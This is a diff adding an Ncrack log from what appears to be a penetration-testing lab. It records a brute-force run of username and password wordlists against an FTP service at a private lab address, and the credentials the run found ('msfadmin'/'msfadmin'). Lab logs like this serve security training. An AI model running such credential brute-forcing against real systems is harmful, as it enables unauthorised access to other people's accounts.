@@ -1,0 +1,7 @@
+# Ncrack 0.7 scan initiated Sat Nov  7 09:40:31 2026 as: ncrack -vv -U /home/kali/lab-output/20261107-093736/wordlists/users.txt -P /home/kali/lab-output/20261107-093736/wordlists/pass-small.txt -f --connection-limit 1 -oN /home/kali/lab-output/20261107-093736/ncrack-ftp.txt ftp://192.168.56.3
+Discovered credentials on ftp://192.168.56.3:21 'msfadmin' 'msfadmin'
+Discovered credentials for ftp on 192.168.56.3 21/tcp:
+192.168.56.3 21/tcp ftp: 'msfadmin' 'msfadmin'
+
+# Ncrack done at Sat Nov  7 09:40:34 2026 -- 1 service scanned in 3.01 seconds.
+Probes sent: 1 | timed-out: 0 | prematurely-closed: 0
